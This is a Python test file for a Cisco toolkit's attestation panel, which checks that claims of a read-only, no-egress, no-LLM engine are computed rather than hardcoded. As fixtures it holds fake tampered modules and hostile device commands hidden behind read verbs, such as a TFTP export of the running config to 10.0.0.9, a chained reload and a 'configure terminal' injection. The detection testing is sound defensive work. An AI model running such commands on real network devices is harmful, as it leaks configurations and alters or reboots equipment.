"""roadmap D3: the zero-egress attestation panel (cisco_toolkit/attestation.py).

The engine's moat — read-only / no-egress / no-LLM by construction — is RE-DERIVED at build
time with the same mechanics as tests/test_readonly_and_no_egress.py and published as
snap['attestation'] + the 'Trust & Sovereignty' workbook sheet. These tests pin:
- every runnable claim HOLDS on the real codebase (the panel and the doctrine test agree);
- a synthetic tampered module tree (a fake package importing `requests` / an LLM SDK)
  drives the import-walk claims to VIOLATED, naming the offending file — falsifiable,
  never a hardcoded badge;
- a missing source tree / missing collector module yields NOT_EVALUATED with a reason —
  results are COMPUTED, never defaulted (absence of evidence is never a pass);
- all four claim ids are ALWAYS present, in a stable order;
- the frozen golden snapshot carries the key (the panel ships on every default run).
"""
import json
import os
import re

from cisco_toolkit.attestation import (
    ATTESTATION_SCHEMA,
    CLAIM_IDS,
    HOLDS,
    NOT_EVALUATED,
    VIOLATED,
    compute_attestation,
)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _by_id(att):
    return {c["id"]: c for c in att["claims"]}


# ------------------------------------------------------------------ shape ---
def test_all_four_claim_ids_always_present_in_stable_order():
    att = compute_attestation()
    assert att["schema"] == ATTESTATION_SCHEMA == "attestation/1"
    assert att["generated_at"]
    assert [c["id"] for c in att["claims"]] == list(CLAIM_IDS) == [
        "read_only_command_surface", "no_egress_import_graph",
        "rest_collect_get_only", "no_llm_runtime"]
    for c in att["claims"]:
        assert c["result"] in {HOLDS, VIOLATED, NOT_EVALUATED}
        assert c["method"] and c["detail"], f"{c['id']}: method/detail must never be empty"


def test_claim_ids_present_even_when_nothing_is_evaluable(tmp_path):
    """The four ids are structural: a run where NO check can execute still publishes all
    four claims — each as an explicit NOT_EVALUATED with a reason, never a silent drop."""
    att = compute_attestation(toolkit_dir=str(tmp_path / "no-such-package"),
                              collector_module="no_such_collector_module_xyz")
    by = _by_id(att)
    assert set(by) == set(CLAIM_IDS)
    for cid in CLAIM_IDS:
        assert by[cid]["result"] == NOT_EVALUATED, f"{cid} must abstain, not default"
        assert by[cid]["detail"], f"{cid}: NOT_EVALUATED must carry its reason"


# ------------------------------------------- the real codebase: all HOLD ---
def test_all_runnable_claims_hold_on_the_real_codebase():
    """The doctrine test (tests/test_readonly_and_no_egress.py) and the shipped panel share
    grammar/mechanics — if the doctrine holds there, every claim must HOLD here too."""
    att = compute_attestation()
    by = _by_id(att)
    for cid in CLAIM_IDS:
        assert by[cid]["result"] == HOLDS, f"{cid}: {by[cid]['detail']}"


def test_read_only_claim_detail_carries_real_counts():
    """The evidence is counted, never vacuous: the registry surface is large and re-derived
    (mirrors the doctrine test's own >=100-commands sanity floor)."""
    c = _by_id(compute_attestation())["read_only_command_surface"]
    m = re.search(r"all (\d+) registry commands", c["detail"])
    assert m, f"detail must state the re-derived command count: {c['detail']}"
    assert int(m.group(1)) >= 100
    assert "COMMANDS_" in c["detail"]


def test_no_egress_claim_names_its_documented_exceptions():
    """Coverage-honesty: every charter exclusion and exception is DISCLOSED in the claim.

    Derived from the LIVE sets, not restated. This test used to hardcode two filenames, and when
    `NO_EGRESS_EXCEPTIONS` was emptied it went on passing — satisfied by a stale METHOD paragraph
    that still announced an exception the DETAIL simultaneously reported as unnecessary. A test that
    names the thing it is checking cannot notice the thing being removed; it pinned a
    self-contradicting client-facing claim in place instead of catching it.
    """
    from cisco_toolkit.attestation import NO_EGRESS_EXCEPTIONS, NO_EGRESS_EXCLUDE

    c = _by_id(compute_attestation())["no_egress_import_graph"]
    published = c["method"] + c["detail"]
    for name in sorted(NO_EGRESS_EXCLUDE | NO_EGRESS_EXCEPTIONS):
        assert name in published, (
            f"{name!r} is excluded or exempted by the charter but is not disclosed in the "
            f"published claim — a subtraction the reader cannot see: {published!r}"
        )
    # Non-vacuity: with both sets empty the loop above would assert nothing at all.
    assert NO_EGRESS_EXCLUDE, "no exclusions left — this test can no longer prove disclosure"
    # And the claim must not announce an exception that is no longer in the set (the defect above).
    for stale in ("gen_port_registry.py",):
        if stale not in {n.rsplit("/", 1)[-1] for n in NO_EGRESS_EXCEPTIONS}:
            assert stale not in published, (
                f"the published claim still names {stale!r} as an exception, but it is not in "
                "NO_EGRESS_EXCEPTIONS — METHOD and DETAIL now contradict each other"
            )


def test_no_egress_walk_reaches_subpackages_and_the_exception_is_not_dead():
    """The walk must be RECURSIVE, and its documented exception must be doing real work.

    Regression: `_iter_py` enumerated `os.listdir` (top level only), so
    `cisco_toolkit/data/gen_port_registry.py` — which imports `urllib.request` and fetches
    iana.org — was never opened, and `NO_EGRESS_EXCEPTIONS` was DEAD CODE. The panel published
    "0 network-library imports across N analysis modules" over a file it had not read, on the
    client-facing Trust & Sovereignty sheet. Two halves, both load-bearing: the scan REACHES the
    subpackage file (it is a real offender before the exception is subtracted), and the claim
    reports the exception as APPLIED rather than as matching nothing."""
    from cisco_toolkit.attestation import (NETWORK_IMPORTS, NO_EGRESS_EXCEPTIONS,
                                           NO_EGRESS_EXCLUDE, scan_imports)
    pkg = os.path.join(ROOT, "cisco_toolkit")
    n, offenders = scan_imports(pkg, NETWORK_IMPORTS, exclude=NO_EGRESS_EXCLUDE)

    # Recursion is proven STRUCTURALLY, against an independent enumeration — not by naming one
    # subpackage file and checking it is an offender. The original form did the latter, using
    # `data/gen_port_registry.py` (which then imported urllib). When that generator was made
    # offline the assertion started demanding a defect that had been REPAIRED, and the test failed
    # for the best possible reason. A guard anchored to one file's current contents expires when
    # that file improves; anchored to the walk itself, it cannot.
    # COMPARE SETS, NOT COUNTS. The first version of this test asserted `n == len(expected)` against
    # an enumeration that differed from `_iter_py` in TWO ways — it kept dot-directories (the impl
    # prunes them) and excluded by BASENAME (the impl excludes by RELPATH). Those divergences point
    # in opposite directions and CANCEL, so the count matched while the sets did not: a
    # `.vendored/hidden_egress.py` importing `requests` was never opened by the scan and the guard
    # stayed green. Equal counts are not equal coverage.
    from cisco_toolkit.attestation import _iter_py

    scanned = {rel for rel, _path in _iter_py(pkg, NO_EGRESS_EXCLUDE)}
    assert len(scanned) == n, "scan_imports did not scan exactly what _iter_py yielded"

    expected = set()
    for dirpath, dirs, files in os.walk(pkg):
        dirs[:] = [d for d in dirs if d != "__pycache__" and not d.startswith(".")]
        for f in files:
            if not f.endswith(".py"):
                continue
            rel = os.path.relpath(os.path.join(dirpath, f), pkg).replace(os.sep, "/")
            if rel not in NO_EGRESS_EXCLUDE:      # RELPATH, matching the implementation
                expected.add(rel)
    assert scanned == expected, (
        "the scan's file set differs from an independent recursive enumeration.\n"
        f"  missed by the scan : {sorted(expected - scanned)}\n"
        f"  scanned but unexpected: {sorted(scanned - expected)}\n"
        "A file the walk never opened must never be counted as one it cleared."
    )
    assert any("/" in rel for rel in expected), (
        "no subpackage .py files exist any more, so this test can no longer prove recursion at all"
    )
    # Both enumerations share `os.walk` with followlinks=False and both prune dot-directories, so a
    # divergence hidden INSIDE those shared choices cannot be caught by comparing sets either. Pin
    # the conditions under which that could matter, so they fail loudly the day they arise instead
    # of silently shrinking the evidence behind a client-facing claim.
    hidden = [os.path.relpath(os.path.join(dp, d), pkg)
              for dp, dirs, _f in os.walk(pkg) for d in dirs
              if d.startswith(".") or os.path.islink(os.path.join(dp, d))]
    assert not hidden, (
        f"dot-directories or directory symlinks under the analysis package: {hidden}. Both "
        "enumerations skip these by construction, so their contents are UNSCANNED while the claim "
        "reads '0 network-library imports'. Decide explicitly whether they must be walked."
    )

    assert set(offenders) <= set(NO_EGRESS_EXCEPTIONS), f"undocumented egress import: {offenders}"
    c = _by_id(compute_attestation())["no_egress_import_graph"]
    assert c["result"] == HOLDS
    # The charter is EMPTY on purpose (see NO_EGRESS_EXCEPTIONS): nothing under the package imports
    # a network library, so the claim carries no caveat. Both halves still matter — a stale
    # exception must still be reported as such, and there must be none to report.
    assert "no documented exception was needed" in c["detail"]
    assert "matched nothing" not in c["detail"], "a never-firing exception is a stale charter"


def test_network_import_in_a_SUBPACKAGE_is_violated(tmp_path):
    """A banned import one directory down must flip the claim, naming its relative path — the
    top-level-only walk reported HOLDS over exactly this shape."""
    pkg = _fake_pkg(tmp_path, {"clean.py": "X = 1\n"})
    sub = tmp_path / "fakepkg" / "sub"
    sub.mkdir()
    (sub / "evil.py").write_text("import socket\n", encoding="utf-8")
    c = _by_id(compute_attestation(toolkit_dir=pkg,
                                   collector_module="no_such_collector_module_xyz"))[
        "no_egress_import_graph"]
    assert c["result"] == VIOLATED
    assert "sub/evil.py" in c["detail"] and "socket" in c["detail"]


def test_charter_exclusion_is_path_scoped_not_basename_scoped(tmp_path):
    """`rest_collect.py` is excluded as a top-level charter case; a same-named file in a
    SUBPACKAGE is a different module and must still be judged (a basename-keyed exclusion would
    silently exempt it)."""
    pkg = _fake_pkg(tmp_path, {"rest_collect.py": 'import requests\n'})
    sub = tmp_path / "fakepkg" / "vendor"
    sub.mkdir()
    (sub / "rest_collect.py").write_text("import requests\n", encoding="utf-8")
    c = _by_id(compute_attestation(toolkit_dir=pkg,
                                   collector_module="no_such_collector_module_xyz"))[
        "no_egress_import_graph"]
    assert c["result"] == VIOLATED and "vendor/rest_collect.py" in c["detail"]


def test_rest_get_only_claim_counts_the_single_login_post():
    c = _by_id(compute_attestation())["rest_collect_get_only"]
    assert c["result"] == HOLDS
    assert "POST" in c["detail"] and "GET" in c["detail"]


# ------------------------------------------------- tampering -> VIOLATED ---
def _fake_pkg(tmp_path, files):
    pkg = tmp_path / "fakepkg"
    pkg.mkdir()
    for name, src in files.items():
        (pkg / name).write_text(src, encoding="utf-8")
    return str(pkg)


def test_tampered_tree_with_requests_import_is_violated(tmp_path):
    """A stray network import in the analysis tree flips no_egress to VIOLATED and NAMES
    the offending module — including a LAZY in-function import (any nesting depth)."""
    pkg = _fake_pkg(tmp_path, {
        "innocent.py": "import os\nX = os.sep\n",
        "evil.py": "def fetch():\n    import requests\n    return requests\n",
    })
    att = compute_attestation(toolkit_dir=pkg, collector_module="no_such_collector_module_xyz")
    c = _by_id(att)["no_egress_import_graph"]
    assert c["result"] == VIOLATED
    assert "evil.py" in c["detail"] and "requests" in c["detail"]
    assert "innocent.py" not in c["detail"]


def test_tampered_tree_with_llm_sdk_import_is_violated(tmp_path):
    """An LLM/GenAI SDK import anywhere in the analysis tree flips no_llm_runtime to
    VIOLATED, naming the module — the 'no LLM in the runtime pipeline' claim is computed."""
    pkg = _fake_pkg(tmp_path, {
        "clean.py": "Y = 2\n",
        "brain.py": "from openai import OpenAI\n",
    })
    att = compute_attestation(toolkit_dir=pkg, collector_module="no_such_collector_module_xyz")
    c = _by_id(att)["no_llm_runtime"]
    assert c["result"] == VIOLATED
    assert "brain.py" in c["detail"] and "openai" in c["detail"]


def test_tampered_rest_collect_with_write_verb_is_violated(tmp_path):
    """A rest_collect.py that grows a DELETE (or a second POST) loses the GET-only claim."""
    pkg = _fake_pkg(tmp_path, {
        "rest_collect.py": ('def bad(u):\n'
                            '    return _open(u, method="POST")\n'
                            'def worse(u):\n'
                            '    return _open(u, method="DELETE")\n'),
    })
    att = compute_attestation(toolkit_dir=pkg, collector_module="no_such_collector_module_xyz")
    c = _by_id(att)["rest_collect_get_only"]
    assert c["result"] == VIOLATED
    assert "DELETE" in c["detail"]


def test_second_post_in_rest_collect_is_violated(tmp_path):
    pkg = _fake_pkg(tmp_path, {
        "rest_collect.py": ('def login(u):\n    return _open(u, method="POST")\n'
                            'def sneaky_write(u):\n    return _open(u, method="POST")\n'),
    })
    c = _by_id(compute_attestation(toolkit_dir=pkg,
                                   collector_module="no_such_collector_module_xyz"))["rest_collect_get_only"]
    assert c["result"] == VIOLATED and "2" in c["detail"]


def test_write_command_in_registry_is_violated():
    """A write verb smuggled into a COMMANDS_* registry flips read_only_command_surface to
    VIOLATED, naming the registry and the command — same falsifier as the doctrine test."""
    import types
    fake = types.ModuleType("fake_collector_with_write_cmd")
    fake.COMMANDS_IOS = ["show version", "configure terminal"]
    import sys
    sys.modules["fake_collector_with_write_cmd"] = fake
    try:
        c = _by_id(compute_attestation(collector_module="fake_collector_with_write_cmd"))[
            "read_only_command_surface"]
        assert c["result"] == VIOLATED
        assert "configure terminal" in c["detail"] and "COMMANDS_IOS" in c["detail"]
    finally:
        del sys.modules["fake_collector_with_write_cmd"]


def test_a_write_tacked_onto_a_read_verb_violates_the_published_claim():
    """The falsifier above uses a BARE write verb, which the verb-anchored regex already caught —
    so it never probed the class that actually threatens this claim: a string that OPENS with a
    legitimate read verb and then writes, egresses or chains.

    `READ_ONLY_CMD.match()` accepts every command below (asserted, so this test fails loudly if
    that premise ever changes). Until the claim was moved onto is_read_only_command(), each of them
    made compute_attestation publish `read_only_command_surface: HOLDS` — the engine certifying a
    read-only command surface while carrying a command that writes to bootflash, TFTPs the running
    config off the box, or types `configure terminal` at the exec prompt on the next line.
    """
    import sys
    import types
    from cisco_toolkit.attestation import READ_ONLY_CMD
    for cmd in ("show running-config | redirect bootflash:pwn.txt",  # NX-OS WRITES that file
                "show running-config | tftp://10.0.0.9/pwn.txt",     # ships the config off-box
                "show version ; reload",
                "show version > bootflash:out.txt",
                "show version\nconfigure terminal\nhostname PWNED"):
        assert READ_ONLY_CMD.match(cmd.strip()), \
            f"premise changed: {cmd!r} no longer passes the verb-anchored regex"
        name = "fake_collector_tacked_on_write"
        fake = types.ModuleType(name)
        fake.COMMANDS_IOS = ["show version", cmd]
        sys.modules[name] = fake
        try:
            c = _by_id(compute_attestation(collector_module=name))["read_only_command_surface"]
            assert c["result"] == VIOLATED, \
                f"attestation published {c['result']} for a registry containing {cmd!r}"
            assert "COMMANDS_IOS" in c["detail"]
        finally:
            del sys.modules[name]


# --------------------------------------------- missing source -> abstain ---
def test_missing_package_source_is_not_evaluated_with_reason(tmp_path):
    att = compute_attestation(toolkit_dir=str(tmp_path / "wheel-without-sources"))
    by = _by_id(att)
    for cid in ("no_egress_import_graph", "rest_collect_get_only", "no_llm_runtime"):
        assert by[cid]["result"] == NOT_EVALUATED
        assert "source" in by[cid]["detail"].lower() or "not" in by[cid]["detail"].lower()
    # the registry claim imports the collector MODULE (not the tree) so it still runs
    assert by["read_only_command_surface"]["result"] == HOLDS


def test_unimportable_collector_is_not_evaluated_with_reason():
    c = _by_id(compute_attestation(collector_module="no_such_collector_module_xyz"))[
        "read_only_command_surface"]
    assert c["result"] == NOT_EVALUATED
    assert "no_such_collector_module_xyz" in c["detail"]


def test_registryless_collector_is_not_evaluated_not_vacuously_holding():
    """A collector module with NO COMMANDS_* registries proves nothing — the claim must
    abstain, never pass vacuously on an empty surface."""
    import sys
    import types
    sys.modules["fake_collector_no_registries"] = types.ModuleType("fake_collector_no_registries")
    try:
        c = _by_id(compute_attestation(collector_module="fake_collector_no_registries"))[
            "read_only_command_surface"]
        assert c["result"] == NOT_EVALUATED
    finally:
        del sys.modules["fake_collector_no_registries"]


# ------------------------------------------------------------------ golden ---
def test_golden_snapshot_carries_the_attestation_key():
    """The panel ships on every default run: the frozen golden carries snap['attestation']
    with all four claims HOLDING (the golden run executes on this very codebase). The
    nested generated_at is stripped by the golden harness as the one volatile field."""
    with open(os.path.join(ROOT, "tests", "golden", "snapshot.json"), encoding="utf-8") as f:
        golden = json.load(f)
    att = golden.get("attestation")
    assert isinstance(att, dict), "golden snapshot must carry the attestation key"
    assert att.get("schema") == ATTESTATION_SCHEMA
    assert "generated_at" not in att, "volatile stamp must be stripped from the golden"
    assert [c["id"] for c in att["claims"]] == list(CLAIM_IDS)
    assert all(c["result"] == HOLDS for c in att["claims"]), att["claims"]


# ------------------------------------------------------------ excel twin ---
def test_trust_sheet_renders_claims_and_honest_abstention(tmp_path):
    from openpyxl import Workbook

    from cisco_toolkit.excel import ATTESTATION_SHEET_NAME, write_attestation_sheet
    wb = Workbook()
    write_attestation_sheet(wb, compute_attestation())
    ws = wb[ATTESTATION_SHEET_NAME]
    blob = "\n".join(str(c.value) for row in ws.iter_rows() for c in row if c.value)
    for cid in CLAIM_IDS:
        assert cid in blob
    assert "HOLDS" in blob and "VIOLATED" not in blob
    # the _unavailable sentinel renders as UNVERIFIED — never as a silent pass
    wb2 = Workbook()
    write_attestation_sheet(wb2, {"_unavailable": True})
    blob2 = "\n".join(str(c.value) for row in wb2[ATTESTATION_SHEET_NAME].iter_rows()
                      for c in row if c.value)
    assert "UNVERIFIED" in blob2 and "HOLDS" not in blob2
